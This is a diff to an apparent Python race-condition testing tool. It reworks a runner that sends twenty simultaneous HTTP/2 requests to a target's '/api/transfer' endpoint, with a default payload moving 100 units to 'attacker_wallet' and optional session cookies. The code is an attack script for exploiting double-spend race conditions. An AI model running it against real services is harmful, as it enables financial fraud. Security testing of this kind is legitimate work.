@@ -94,7 +94,8 @@ async def fire_single_packet_race_async(host, port, path, payload, secure, num_s
 def run_race_condition_test(target_host, port=None, use_ssl=None, payload=None, cookies=None, headers=None):
     """
     Synchronous wrapper matching your original runner interface, 
-    upgraded under the hood to execute true HTTP/2 single-packet concurrency.
+    upgraded under the hood to execute true HTTP/2 single-packet concurrency 
+    with safe event-loop reuse.
     """
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     host = parsed.hostname
@@ -105,15 +106,27 @@ def run_race_condition_test(target_host, port=None, use_ssl=None, payload=None, 
     test_endpoint = base_path + "/api/transfer" if base_path else "/api/transfer"
     test_payload = payload or {"amount": 100, "recipient": "attacker_wallet"}
     
-    return asyncio.run(
-        fire_single_packet_race_async(
-            host=host,
-            port=target_port,
-            path=test_endpoint,
-            payload=test_payload,
-            secure=secure,
-            num_streams=20,
-            cookies=cookies,
-            headers=headers
-        )
+    coro = fire_single_packet_race_async(
+        host=host,
+        port=target_port,
+        path=test_endpoint,
+        payload=test_payload,
+        secure=secure,
+        num_streams=20,
+        cookies=cookies,
+        headers=headers
     )
+    
+    try:
+        loop = asyncio.get_running_loop()
+    except RuntimeError:
+        loop = None
+
+    if loop and loop.is_running():
+        # If called from an active event loop, schedule it cleanly
+        # Note: If called synchronously via ThreadPoolExecutor, this handles it via a new loop or thread future.
+        import concurrent.futures
+        with concurrent.futures.ThreadPoolExecutor() as pool:
+            return pool.submit(asyncio.run, coro).result()
+    else:
+        return asyncio.run(coro)
